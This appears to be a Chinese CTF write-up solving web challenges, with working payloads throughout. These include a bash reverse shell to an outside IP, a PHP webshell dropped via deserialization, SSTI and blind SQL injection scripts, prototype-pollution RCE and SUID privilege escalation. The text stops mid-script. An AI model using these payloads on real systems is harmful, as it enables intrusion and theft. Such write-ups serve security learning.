http://c6wgxl35yii5gu40b1oi0ob46.node.game.sycsec.com/hack?klf=1 --os-shell 检测出来是盲注，反应都会很慢，这里可以把shell反弹到自己的服务器上\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/101.35.19.78/100 0\u0026gt;\u0026amp;1\u0026#34; 再次证明了科技的重要性😂\nez_remove #\r\u0026lt;?php\rhighlight_file(__FILE__);\rclass syc{\rpublic $lover;\rpublic function __destruct()\r{\reval($this-\u0026gt;lover);\r}\r}\rif(isset($_GET[\u0026#39;web\u0026#39;])){\rif(!preg_match(\u0026#39;/lover/i\u0026#39;,$_GET[\u0026#39;web\u0026#39;])){\r$a=unserialize($_GET[\u0026#39;web\u0026#39;]);\rthrow new Error(\u0026#34;快来玩快来玩~\u0026#34;);\r}\relse{\recho(\u0026#34;nonono\u0026#34;);\r}\r}\r?\u0026gt; 两个考点\n其一：这个preg_match正则匹配在这样的模式下，是不存在漏洞的，也就无法使用上面那道题说过的换行符绕过，并且由于序列化字符串的特性，我们并不能修改字符串的值，但是可以改变其进制，当序列化字符串中的s属性为大写时候，就能够识别后面字符串中的十六进制字符\n其二：throw出的Error会打断正常的反序列化，从而无法destruct，这里可以通过PHP的GC垃圾回收机制绕过\n贴一下文章：浅析PHP GC垃圾回收机制及常见利用方式（一）-阿里云开发者社区 (aliyun.com)\n上面可以看到能够进行命令执行的命令都被ban了，用不了\n这里可以使用php的file_put_content函数，写入一个php木马\n\u0026lt;?php\rclass syc{\rpublic $lover=\u0026#34;file_put_contents(\u0026#39;shell.php\u0026#39;, \u0026#39;\u0026lt;?php eval(\\$_POST[a])?\u0026gt;\u0026#39;);\u0026#34;;\rpublic function __destruct()\r{\reval($this-\u0026gt;lover);\r}\r}\r$a=new syc();\r$s=serialize(array($a,0));\recho serialize(array($a,0));\recho PHP_EOL;\rpreg_replace(\u0026#39;lover\u0026#39;,\u0026#39;\\\\6cover\u0026#39;,$s);\recho $s;\r#再自己修改一下\r#a:2:{i:0;O:3:\u0026#34;syc\u0026#34;:1:{S:5:\u0026#34;\\6cover\u0026#34;;s:58:\u0026#34;file_put_contents(\u0026#39;shell.php\u0026#39;, \u0026#39;\u0026lt;?php eval($_POST[a])?\u0026gt;\u0026#39;);\u0026#34;;}i:0;i:0;} 由于刚才说过，被ban了，这里只能上蚁剑来找了\n根目录下打开看不见，并不代表他没有哦\nez_path #\r题目源码给了提示\npyc反编译后看到的部分代码👇\n# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information\r# Version : Python 3.6\rimport os\rimport uuid\rfrom flask import Flask, render_template, request, redirect\rapp = Flask(__name__)\rARTICLES_FOLDER = \u0026#39;articles/\u0026#39;\rarticles = []\rclass Article:\rdef __init__(self, article_id, title, content):\rself.article_id = article_id\rself.title = title\rself.content = content\rdef generate_article_id():\rreturn str(uuid.uuid4())\rdef index():\rreturn render_template(\u0026#39;index.html\u0026#39;, articles, **(\u0026#39;articles\u0026#39;,))\rindex = app.route(\u0026#39;/\u0026#39;)(index)\rdef upload():\rif request.method == \u0026#39;POST\u0026#39;:\rtitle = request.form[\u0026#39;title\u0026#39;]\rcontent = request.form[\u0026#39;content\u0026#39;]\rarticle_id = generate_article_id()\rarticle = Article(article_id, title, content)\rarticles.append(article)\rsave_article(article_id, title, content)\rreturn redirect(\u0026#39;/\u0026#39;)\rreturn None(\u0026#39;upload.html\u0026#39;)\rupload = app.route(\u0026#39;/upload\u0026#39;, [\r\u0026#39;GET\u0026#39;,\r\u0026#39;POST\u0026#39;], **(\u0026#39;methods\u0026#39;,))(upload)\rdef article(article_id):\rpass\r# WARNING: Decompyle incomplete\rarticle = app.route(\u0026#39;/article/\u0026lt;article_id\u0026gt;\u0026#39;)(article)\rdef save_article(article_id, title, content):\rsanitized_title = sanitize_filename(title)\rarticle_path = ARTICLES_FOLDER + \u0026#39;/\u0026#39; + sanitized_title\r# WARNING: Decompyle incomplete\rdef sanitize_filename(filename):\rsensitive_chars = [\r\u0026#39;:\u0026#39;,\r\u0026#39;*\u0026#39;,\r\u0026#39;?\u0026#39;,\r\u0026#39;\u0026#34;\u0026#39;,\r\u0026#39;\u0026lt;\u0026#39;,\r\u0026#39;\u0026gt;\u0026#39;,\r\u0026#39;|\u0026#39;,\r\u0026#39;.\u0026#39;]\rfor char in sensitive_chars:\rfilename = filename.replace(char, \u0026#39;_\u0026#39;)\rreturn filename\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.run(True, **(\u0026#39;debug\u0026#39;,)) flask模板搭建的，其他没啥好说的，关键点就在于article_path拼接的部分，并没有过滤掉/斜杠，可以在读取的时候进行目录穿越，只需要把文章的title设置为/f14444，然后再点开就行了\n哈哈，这道题被我拿了一血，高兴一下O(∩_∩)O\nyou konw flask? #\r两个路由，注册和登录，注册的时候显示admin已被注册，很明显是要伪造admin身份进去\n接下来就是要找到secretkey值，进入robots.txt发现一个新的页面\n只需要写个脚本爆破一下就行了\n#!/usr/bin/env python3\r\u0026#34;\u0026#34;\u0026#34; Flask Session Cookie Decoder \u0026#34;\u0026#34;\u0026#34;\r__author__ = \u0026#39;Wilson Sumanang, Alexandre ZANNI\u0026#39;\rimport zlib\rfrom itsdangerous import base64_decode\rimport ast\rimport os\rfrom flask.sessions import SecureCookieSessionInterface\rimport hashlib\rimport base64\rimport random\rclass MockApp(object):\rdef __init__(self, secret_key):\rself.secret_key = secret_key\rclass FSCM:\r@staticmethod\rdef decode(session_cookie_value, secret_key=None):\rtry:\rif secret_key is None:\rcompressed = False\rpayload = session_cookie_value\rif payload.startswith(\u0026#39;.\u0026#39;):\rcompressed = True\rpayload = payload[1:]\rdata = payload.split(\u0026#34;.\u0026#34;)[0]\rdata = base64_decode(data)\rif compressed:\rdata = zlib.decompress(data)\rreturn data\relse:\rapp = MockApp(secret_key)\rsi = SecureCookieSessionInterface()\rs = si.get_signing_serializer(app)\rreturn s.loads(session_cookie_value)\rexcept Exception as e:\rreturn \u0026#34;[Decoding error] {}\u0026#34;.format(e)\rif __name__ == \u0026#34;__main__\u0026#34;:\rcnt = 1\rwhile True:\rcookie_value = \u0026#39;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiIxMjMiLCJ1c2VyX2lkIjoyfQ.ZUO2Eg.dxE1Jqo7vrBWygtgbQ8RndUZHJQ\u0026#39;\rsecret_key = \u0026#39;wanbao\u0026#39;+base64.b64encode(str(random.randint(1, 100)).encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;)+\u0026#39;wanbao\u0026#39;\rif secret_key:\rresult = FSCM.decode(cookie_value, secret_key)\relse:\rresult = FSCM.decode(cookie_value)\rcnt += 1\rprint(result, cnt)\rif \u0026#39;[Decoding error]\u0026#39; not in result:\rprint(result, secret_key, \u0026#39;YES\u0026#39;)\rbreak 找到了key，加密换上进去\n在学员管理界面拿到flag\nPupyy_rce #\r悄悄话：这道题是第一周放出来了大概半小时又下线了，后面才放出来，当时我payload都写好了，可惜\n源码如下👇\n\u0026lt;?php\rhighlight_file(__FILE__);\rheader(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;);\rerror_reporting(0);\rinclude(flag.php);\r//当前目录下有好康的😋\rif (isset($_GET[\u0026#39;var\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;var\u0026#39;]) {\r$var = $_GET[\u0026#39;var\u0026#39;];\rif (!preg_match(\u0026#34;/env|var|session|header/i\u0026#34;, $var,$match)) {\rif (\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[^\\s\\(\\)]+?\\((?R)?\\)/\u0026#39;, \u0026#39;\u0026#39;, $var)){\reval($_GET[\u0026#39;var\u0026#39;]);\r}\relse die(\u0026#34;WAF!!\u0026#34;);\r} else{\rdie(\u0026#34;PLZ DONT HCAK ME😅\u0026#34;);\r}\r} 这个正则匹配是经典的无参数RCE模式\n使用php的内置函数读取文件即可\n当前目录存在flag.php\npayload👇\n?var=show_source(array_rand(array_flip(scandir(current(localeconv()))))); 这里采用的方法是随机读取当前目录的文件，一直刷新就能读取到flag\nfamale_imp_l0v #\r两个php，一个用来上传zip文件，另一个用来包含文件\n\u0026lt;?php\r//o2takuXX师傅说有问题，忘看了。\rheader(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;);\rhighlight_file(__FILE__);\r$file = $_GET[\u0026#39;file\u0026#39;];\rif(isset($file) \u0026amp;\u0026amp; strtolower(substr($file, -4)) == \u0026#34;.jpg\u0026#34;){\rinclude($file);\r}\r?\u0026gt; 不难想到php伪协议中的zip://伪协议\n要先把php文件进行打包进zip，然后上传zip，再到include.php进行文件包含，要注意使用zip伪协议的时候如果想要进一步达到zip里的文件，需要使用 # 井号连接，并且要urlencode\n贴一个文章：【文件上传】zip伪协议上传解析_zip:///-CSDN博客\n雨 #\rVanZY给白月光写了一张明信片，快去帮他把id签上吧\n在hint路由下给出了secret_key的信息\n同时在http头里发现cookie\n不过这道题不是flask session，而是jwt token，两者的区别可以自行搜索\n两者的加密方式不同，写的脚本也不同\nimport jwt\r# 示例用法\rpayload = {\u0026#39;user\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;iat\u0026#39;: 1698977214}\rsecret_key = \u0026#39;VanZY\u0026#39;\rencoded_token = jwt.encode(payload, secret_key, algorithm=\u0026#39;HS256\u0026#39;)\rprint(encoded_token.encode())\r#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2OTg5NzcyMTR9.QsHyTGY5GnM7WWzf69WbkVOj8UySuBpIsTQfR8Jr2q0 下面是source源码👇\nconst express = require(\u0026#39;express\u0026#39;);\rconst jwt = require(\u0026#39;jsonwebtoken\u0026#39;);\rconst app = express();\rconst bodyParser = require(\u0026#39;body-parser\u0026#39;)\rconst path = require(\u0026#39;path\u0026#39;);\rconst jwt_secret = \u0026#34;VanZY\u0026#34;;\rconst cookieParser = require(\u0026#39;cookie-parser\u0026#39;);\rconst putil_merge = require(\u0026#34;putil-merge\u0026#34;)\rapp.set(\u0026#39;views\u0026#39;, \u0026#39;./views\u0026#39;);\rapp.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;);\rapp.use(cookieParser());\rapp.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())\rvar Super = {};\rvar safecode = function (code){\rlet validInput = /global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\\+|\\*/ig;\rreturn !validInput.test(code);\r};\rapp.all(\u0026#39;/code\u0026#39;, (req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rif (req.method == \u0026#34;POST\u0026#34; \u0026amp;\u0026amp; req.body) {\rputil_merge({}, req.body, {deep:true});\r}\rres.send(\u0026#34;welcome to code\u0026#34;);\r});\rapp.all(\u0026#39;/hint\u0026#39;, (req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rres.send(\u0026#34;I heard that the challenge maker likes to use his own id as secret_key\u0026#34;);\r});\rapp.get(\u0026#39;/source\u0026#39;, (req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rvar auth = req.cookies.auth;\rjwt.verify(auth, jwt_secret , function(err, decoded) {\rtry{\rif(decoded.user===\u0026#39;admin\u0026#39;){\rres.sendFile(path.join(__dirname + \u0026#39;/index.js\u0026#39;));\r}else{\rres.send(\u0026#39;you are not admin \u0026lt;!--Maybe you can view /hint--\u0026gt;\u0026#39;);\r}\r}\rcatch{\rres.send(\u0026#34;Fuck you Hacker!!!\u0026#34;)\r}\r});\r});\rapp.all(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rif (!req.body.name || req.body.name === undefined || req.body.name === null){\rres.send(\u0026#34;please input name\u0026#34;);\r}else {\rif (Super[\u0026#39;userrole\u0026#39;] === \u0026#39;Superadmin\u0026#39;) {\rres.render(\u0026#39;index\u0026#39;, req.body);\r}else {\rif (!safecode(req.body.name)) {\rres.send(\u0026#34;你在做什么？快停下！！！\u0026#34;)\r}\relse{\rres.render(\u0026#39;index\u0026#39;, {name: req.body.name});\r}\r}\r}\r});\rapp.get(\u0026#39;/\u0026#39;,(req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rvar token = jwt.sign({\u0026#39;user\u0026#39;:\u0026#39;guest\u0026#39;},jwt_secret,{ algorithm: \u0026#39;HS256\u0026#39; });\rres.cookie(\u0026#39;auth \u0026#39;,token);\rres.end(\u0026#39;Only admin can get source in /source\u0026#39;);\r});\rapp.listen(3000, () =\u0026gt; console.log(\u0026#39;Server started on port 3000\u0026#39;)); 在create路由下可以看到有一个Superadmin的验证，在code路由下有一个POST传入并且merge合并的过程\n不难联想到原型链污染的相关知识，由于Super本身是空的，我们需要在code页面下POST一个JSON包污染object的原型，从而使所有对象都带有userrole属性且值为Superadmin\n这里我用__proto__不知道怎么不行，只能使用constructor来实现，这个在0xgame比赛里有用到过\n在这里贴两个文章\n理解原型链污染 - depy (rce.ink)\nNode.js原型链污染的利用 - FreeBuf网络安全行业门户\n污染之后再进入create路由下，name参数就没有任何限制了\n经过后来学习，这道题和name没什么关系，主要还是ejs这个模板的render渲染问题\n这个模板是存在CVE漏洞的，网上可以搜一下\n这道题和HGAME2023中WEEK4的Shared Dairy比较相似，可以找官方WP看看，这里不再赘述\n由于这个ejs的版本比较高，原本的outputFunctionName在这里就成为了非法字符，好在官方修复的时候好像漏掉了一个escapeFunction，刚好可以利用\n直接说做题步骤，现在code页面进行原型链污染，注意箭头指的地方\n然后只修改第一行的code为create，其他的别动，也别另外开一个repeater，就在这一个操作\n得到flag的名字，然后再回到code页面修改命令执行，最后跳回create界面即可\n针对于这个ejs模板，我再贴几个文章：\nhttps://inhann.top/2023/03/26/ejs/\nhttps://thnpkm.xyz/index.php/archives/111/\nhttps://www.ctfiot.com/120877.html\nklf_2 #\r发现一个secret\n参数还是klf，这次用脚本跑不出来了，得用手注\n这次过滤的很严格，比如常见的关键字：class，global，getitem等等\n以及一些特殊符号：单双引号、中括号、加减乘除、斜杠等等\n不过好在可以通过set方法来处理字符串\n我这里就直接上payload来对着说吧\nhttp://qkxc2u105bpv62hkormtdb5oc.node.game.sycsec.com/secr3ttt?klf=\r{%set b=dict(po=1,p=2)|join%}#用于提取字符串中的某个字符，用法pop(5)\r{%set line=(lipsum|string|list)|attr(b)(18) %} #通过lipsum来获取单个下划线\r{%set towline=(line,line)|join %} #下划线组合成两个下划线\r{%set glbs=((towline,dict(glo=1,bals=2)|join)|join,towline)|join%}#dict合成__globals__关键字\r{%set gtitem=(towline,dict(ge=1,titem=2)|join,towline)|join%} #dict合成__getitem__关键字\r{%set pp=dict(po=a,pen=2)|join%} #dict合成popen关键字\r{%set oo=dict(o=a,s=b)|join%} #os\r{%set rd=dict(re=1,ad=2)|join%} #read {%set kg=lipsum|string|list|attr(b)(9)%} #获取空格\r{%set bult=(towline,dict(bui=1,ltins=2)|join,towline)|join%} #获取__builtins__\r{%set ch=dict(ch=1,r=2)|join%} #获取chr字符串，因为特殊符号斜杠被过滤了，这里只能使用chr来创建 {%set gt=dict(get=a)|join%} #get\r{%set cha=(lipsum|attr(glbs))|attr(gt)(bult)|attr(gt)(ch)%} #创建chr函数\r{%set rd=dict(re=1,ad=2)|join%} #read ？上面好像写过了 。。。。。我的\r{%set sv=lipsum|string|list|attr(b)(36)%} #获取数字7，因为斜杠\\的ascii是47，这里7是会被检测\r{%set f=4%} #获取4\r{%set ap=dict(ap=1,p=2)|join%} #我在当前目录没有找到flag，真的flag在/app路由下\r{%set n=(f,sv)|join|int%} #组成47的数字，这个int有必要\r{%set fl=dict(f=1,l=2)|join%} {%set gg=(f,dict(g=1)|join)|join%} #flag的名字叫 fl4gfl4gfl4g\r{%set fg=(fl,gg,fl,gg,fl,gg)|join%} #这连着的三个应该可以优化，我写的有点臃肿\r{%set shell=((dict(ca=1,t=2)|join,kg,cha(n))|join,ap,cha(n),fg)|join%}#cat /app/fl4gfl4gfl4g\r{{lipsum|attr(glbs)|attr(gtitem)(oo)|attr(pp)(shell)|attr(rd)()}} #执行完 相关链接👇\nFlask-jinja2 SSTI 一般利用姿势 – AndyNoel\u0026rsquo;s Blog\nCTFSHOW SSTI web369-web372 拼接绕过_ssti 369-CSDN博客\n关于SSTI注入的二三事 - 先知社区 (aliyun.com)\n有趣的事情：去SYC面试的时候，好像问到SSTI部分，Delty（我觉得应该是他）问我当斜杠被过滤掉的时候怎么办？当时摆头不知道，他就说用builtins这个关键字引入chr函数。做这道题的时候就想起来这件事\nez_sql #\r一道布尔盲注的题目\n题目给了一个ID输入框，测试过后是字符型单引号闭合\n而且页面有三种回显状态\n第一种就是上图的回显查询ID\n第二种是输入了非法字符会回显：waf！！！\n第三种对应的是查询失败，或者说sql语句有问题，执行出错，但没有报错信息，只会回显：别翻啦！这么多心灵鸡汤都du不了你吗\n上burp看看过滤了哪些👇，在intruder里标记参数，字典用的网上随便找的\n一些常用的比如：or、sleep、id、substr、mid、left、right、三个报错函数、database、benchmark、count、concat、information_schema以及空格等等\n能用的有：（、）、select、where、like、regexp、union、length、limit、from等等\n不难想到这是通过like模糊查询的布尔盲注题目\n首先，database被ban了，如何查询数据库呢？（这道题的flag不在当前数据库\n用like模糊查询得知当前mysql版本是5.7几，而在5.7之后mysql默认存在一个sys.schema_table_statistics_with_buffer库，里面存放了所有库的名称，里面的字段名有table_schema和table_name，用于存放表以及对应的数据库\n那就先来跑一下数据库和表名\n如果不加上table名称的限制的话，跑出来的当前数据库就是articles，里面是没有flag的，这里就不再截图\n到这一步的话，sys这个表就没什么用处了，因为里面没有字段的名称\n接下来就是要使用无列名布尔盲注，join在这里也是被ban了的，不过也有其他的方式\n这里放几个文章，我也不再赘述了（懒的打字。。）：\nMysql无列名注入/PDO/变量注入 | (guokeya.github.io)\n无列名注入绕过information_schema – JohnFrod\u0026rsquo;s Blog\nMySQL LIKE：模糊查询 - 安暖如初 - 博客园 (cnblogs.com)\n首先要确定flag表有几列，这个用无列名加上group by看回显就能知道flag只有一列\n然后我在本地测试的话，能通过的是下面这种形式的\nselect \u0026#39;0\u0026#39; ||\r(select/**/hex(e.c)/**/from (select/**/c/**/from/**/(select/**/2/**/c/**/union/**/select/**/*/**/from/**/ctf.flll444aaggg9)x/**/limit/**/1,1)e/**/where/**/length(hex(e.c))\u0026gt;1/**/and/**/e.c/**/like/**/\u0026#39;%\u0026#39;)\r||\u0026#39;0\u0026#39;; 根据这个，针对like的部分写脚本\nimport requests\rimport string\rdic=\u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^`{|}~_\u0026#34;\rurl=\u0026#39;http://47.108.56.168:1113/\u0026#39;\rpayload={\u0026#34;id\u0026#34;:\u0026#34;0\u0026#39;||(select/**/hex(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/length(hex(table_name))\u0026gt;1/**/and/**/hex(table_name)/**/like/**/\u0026#39;%\u0026#39;/**/limit/**/0,1)||\u0026#39;0\u0026#34;}\rpart1=\u0026#34;0\u0026#39;||(select/**/hex(e.c)/**//**/from/**/(select/**/c/**/from/**/(select/**/2/**/c/**/union/**/select/**/*/**/from/**/ctf.flll444aaggg9)x/**/limit/**/2,1)e/**//**/where/**/length(hex(e.c))\u0026gt;1/**/and/**//**/e.c/**/like/**/binary/**/\u0026#39;\u0026#34;\r#part1=\u0026#34;0\u0026#39;||(select/**/hex(table_name)/**/from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_schema/**/like/**/\u0026#39;ctf\u0026#39;/**/and/**/hex(table_name)/**/like/**/\u0026#39;\u0026#34;\rpart2=\u0026#34;%\u0026#39;/**//**/)||\u0026#39;0\u0026#34;\rmidpart=\u0026#39;\u0026#39;\rwhile True:\rcheck=0\rfor i in dic:\rpayload={\u0026#34;id\u0026#34;:part1+midpart+i+part2}\rprint(payload)\rr=requests.post(url,payload).text\rif \u0026#39;别翻啦\u0026#39; not in r and \u0026#39;waf\u0026#39; not in r and \u0026#39;你搁这\u0026#39; not in r:\rmidpart+=i\rprint(i)\rcheck=1\rbreak;\rif check==0:\rbreak\rprint(midpart)\rprint(midpart)\r#SYC{73hd72hfds68r42yuf874r79v8sd43u89f} 注意几个点，dic字典里要把下划线放到最后一个位置，因为like模糊查询里下划线能匹配任意单个字符，不要有百分号\nlike后面加一个binary用于区分大小写\n又拿了一个一血，喜喜🤭\nEzRce #\r源码如下\n\u0026lt;?php\rinclude(\u0026#39;waf.php\u0026#39;);\rsession_start();\rshow_source(__FILE__);\rerror_reporting(0);\r$data=$_GET[\u0026#39;data\u0026#39;];\rif(waf($data)){\reval($data);\r}else{\recho \u0026#34;no!\u0026#34;;\r}\r?\u0026gt; 用python跑了一下，能用的字符有这些\naelvAELV!\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^_`| 用异或构造字符串phpinfo()\n\u0026lt;?php\r$e=(\u0026#39;L\u0026#39;^\u0026#39;\u0026lt;\u0026#39;).(\u0026#39;L\u0026#39;^\u0026#39;$\u0026#39;).(\u0026#39;L\u0026#39;^\u0026#39;\u0026lt;\u0026#39;).(\u0026#39;L\u0026#39;^\u0026#39;%\u0026#39;).(\u0026#39;\u0026#34;\u0026#39;^\u0026#39;L\u0026#39;).(\u0026#39;L\u0026#39;^\u0026#39;*\u0026#39;).(\u0026#39;#\u0026#39;^\u0026#39;L\u0026#39;);//phpinfo\r($e)();\r#在p神的文章中学到的 贴几个文章：\n老生常谈的无字母数字 Webshell 总结 - FreeBuf网络安全行业门户\n无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)\n一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)\n一些被ban的函数\n注意到源码当中有一个session开启的部分，可以进行利用\n注意这个data也是要进行异或构成的，这里给一个python脚本\n由于在disable_function里没有禁用file_put_contents，于是可以写入一个PHP文件来方便命令执行，同时注意函数的括号嵌套\nimport string\rdic=\u0026#39;aelvAELV!#$%\u0026amp;\u0026#39;+\u0026#34;()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`|\u0026#34;\rwant=\u0026#34;session_id\u0026#34;\rres=\u0026#34;\u0026#34;\rfor c in want:\rfor i in dic:\rcheck=0\rfor j in dic:\rif ord(i)^ord(j)==ord(c):\rprint(i,j)\rres+=f\u0026#34;(\u0026#39;{i}\u0026#39;^\u0026#39;{j}\u0026#39;).\u0026#34;\rcheck=1\rbreak\rif check==1:\rbreak\rprint(res) data的部分的话，每个异或组成的字符串都要额外用一对括号括起来，就像上面的那个phpinfo一样\n然后在新建的文件下进行命令执行，更方便一些，不用再转进制\n由于在phpinfo里面禁用了大部分的命令执行函数，但是还是可以使用proc_popen这个函数\n贴一个文章：绕过Disable Functions来搞事情 - FreeBuf网络安全行业门户\n这里我是用到反弹shell，因为后面要进行提权，当前权限不能够读取flag，在自己服务器上写一个一句话反弹shell的命令，保存在txt中，再用靶机curl执行，自己服务器开启nc监听\n如下，权限不够是读不到的，这里就涉及到suid提权\n贴两个文章：\nSUID提权总结及利用演示 - leviathan123 - 博客园 (cnblogs.com)\n红队笔记之Suid提权浅析与利用方法总结_suid提权、-CSDN博客\nfind / -user root -perm -4000 -print 2\u0026gt;/dev/null #在里面查到有find命令，可以操作 进入tmp目录touch一个111文件就行了，不用写内容\nfind 111 -exec code \\; #这个时候find执行命令的时候就是以root身份，code可控，要切换到tmp目录 拿到flag，记得把空格转换为下划线\nezpython #\r源码如下👇\nimport json\rimport os\rfrom waf import waf\rimport importlib\rfrom flask import Flask,render_template,request,redirect,url_for,session,render_template_string\rapp = Flask(__name__)\rapp.secret_key=\u0026#39;jjjjggggggreekchallenge202333333\u0026#39;\rclass User():\rdef __init__(self):\rself.username=\u0026#34;\u0026#34;\rself.password=\u0026#34;\u0026#34;\rself.isvip=False\rclass hhh(User):\rdef __init__(self):\rself.username=\u0026#34;\u0026#34;\rself.password=\u0026#34;\u0026#34;\rregistered_users=[]\r@app.route(\u0026#39;/\u0026#39;)\rdef hello_world(): # put application\u0026#39;s code here\rreturn render_template(\u0026#34;welcome.html\u0026#34;)\r@app.route(\u0026#39;/play\u0026#39;)\rdef play():\rusername=session.get(\u0026#39;username\u0026#39;)\rif username:\rreturn render_template(\u0026#39;index.html\u0026#39;,name=username)\relse:\rreturn redirect(url_for(\u0026#39;login\u0026#39;))\r@app.route(\u0026#39;/login\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;])\rdef login():\rif request.method == \u0026#39;POST\u0026#39;:\rusername=request.form.get(\u0026#39;username\u0026#39;)\rpassword=request.form.get(\u0026#39;password\u0026#39;)\ruser = next((user for user in registered_users if user.username == username and user.password == password), None)\rif user:\rsession[\u0026#39;username\u0026#39;] = user.username\rsession[\u0026#39;password\u0026#39;]=user.password\rreturn redirect(url_for(\u0026#39;play\u0026#39;))\relse:\rreturn \u0026#34;Invalid login\u0026#34;\rreturn redirect(url_for(\u0026#39;play\u0026#39;))\rreturn render_template(\u0026#34;login.html\u0026#34;)\r@app.route(\u0026#39;/register\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;])\rdef register():\rif request.method == \u0026#39;POST\u0026#39;:\rtry:\rif waf(request.data):\rreturn \u0026#34;fuck payload!Hacker!!!\u0026#34;\rdata=json.loads(request.data)\rif \u0026#34;username\u0026#34; not in data or \u0026#34;password\u0026#34; not in data:\rreturn \u0026#34;连用户名密码都没有你注册啥呢\u0026#34;\ruser=hhh()\rmerge(data,user)\rregistered_users.append(user)\rexcept Exception as e:\rreturn \u0026#34;泰酷辣,没有注册成功捏\u0026#34;\rreturn redirect(url_for(\u0026#39;login\u0026#39;))\relse:\rreturn render_template(\u0026#34;register.html\u0026#34;)\r@app.route(\u0026#39;/flag\u0026#39;,methods=[\u0026#39;GET\u0026#39;])\rdef flag():\ruser = next((user for user in registered_users if user.username ==session[\u0026#39;username\u0026#39;] and user.password == session[\u0026#39;password\u0026#39;]), None)\rif user:\rif user.isvip:\rdata=request.args.get(\u0026#39;num\u0026#39;)\rif data:\rif \u0026#39;0\u0026#39; not in data and data != \u0026#34;123456789\u0026#34; and int(data) == 123456789 and len(data) \u0026lt;=10:\rflag = os.environ.get(\u0026#39;geek_flag\u0026#39;)\rreturn render_template(\u0026#39;flag.html\u0026#39;,flag=flag)\relse:\rreturn \u0026#34;你的数字不对哦!\u0026#34;\relse:\rreturn \u0026#34;I need a num!!!\u0026#34;\relse:\rreturn render_template_string(\u0026#39;这种神功你不充VIP也想学?\u0026lt;p\u0026gt;\u0026lt;img src=\u0026#34;{{url_for(\\\u0026#39;static\\\u0026#39;,filename=\\\u0026#39;weixin.png\\\u0026#39;)}}\u0026#34;\u0026gt;要不v我50,我送你一个VIP吧,嘻嘻\u0026lt;/p\u0026gt;\u0026#39;)\relse:\rreturn \u0026#34;先登录去\u0026#34;\rdef merge(src, dst):\rfor k, v in src.items():\rif hasattr(dst, \u0026#39;__getitem__\u0026#39;):\rif dst.get(k) and type(v) == dict:\rmerge(v, dst.get(k))\relse:\rdst[k] = v\relif hasattr(dst, k) and type(v) == dict:\rmerge(v, getattr(dst, k))\relse:\rsetattr(dst, k, v)\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.run(host=\u0026#34;0.0.0.0\u0026#34;,port=\u0026#34;8888\u0026#34;) 首先看到源码中有一个merge函数，这个在js的原型链污染中有看到过，结合题目信息，得知这道题是关于python原型链污染\n首先给两篇文章学习一下👇\npython原型链污染总结 | H4cking to the Gate . (h4cking2thegate.github.io)\n(*´∇｀*) 欢迎回来！ (cnblogs.com)\n在注册页面可以抓包尝试添加如下污染内容\n由于有waf的存在，肯定是过不了的，不过可以使用unicode编码绕过。（unicode编码就是字符转为16进制然后添加前缀\\u00即可\n然后进入flag页面，需要传一个参数num进行比较，通过源码可知num的条件\n其实只需要让num等于123456789后加一个空格，即可绕过，因为int函数会自动去除空格\nklf_3 #\r这道题的话，嗯。。。可以直接用klf_2的payload打，没有一点障碍\n可能是因为我打2的时候想得太多了，多绕了几下，本来2可能没有那么难，这道题直接照着上面的打就行了。。。\nAkane! #\r源码如下👇\n\u0026lt;?php\rerror_reporting(0);\rshow_source(__FILE__);\rclass Hoshino\r{\rpublic $Ruby;\rprivate $Aquamarine;\rpublic function __destruct()\r{\r$this-\u0026gt;Ruby-\u0026gt;func();\r}\r}\rclass Idol\r{\rpublic $Akane;\rpublic function __wakeup()\r{\r$this-\u0026gt;Akane = \u0026#39;/var/www/html/The************************.php\u0026#39;;\r}\rpublic function __call($method,$args)\r{\r$Kana = count(scandir($this-\u0026gt;Akane));\rif ($Kana \u0026gt; 0) {\rdie(\u0026#39;Kurokawa Akane\u0026#39;);\r} else {\rdie(\u0026#39;Arima Kana\u0026#39;);\r}\r}\r}\r$a = unserialize(base64_decode($_GET[\u0026#39;tuizi\u0026#39;]));\r?\u0026gt; 有一道贵阳大数据CTF的题目和这个比较相似\n贵阳大数据及网络安全精英对抗赛-解题赛 WP - Yulate\u0026rsquo;s Blog\n2023 贵阳大数据 CTF 部分题解 | 南溟NaN (southsea.st)\n利用点就是scandir这个函数，已知scandir使用的时候不管有没有东西，都会返回一个数组里面包含一两个点，如果使用glob://协议的话，就不会包含点，结合count函数会计入点的特性，用glob协议来对php文件名进行爆破\n我的py脚本👇\nimport string\rimport requests\rimport 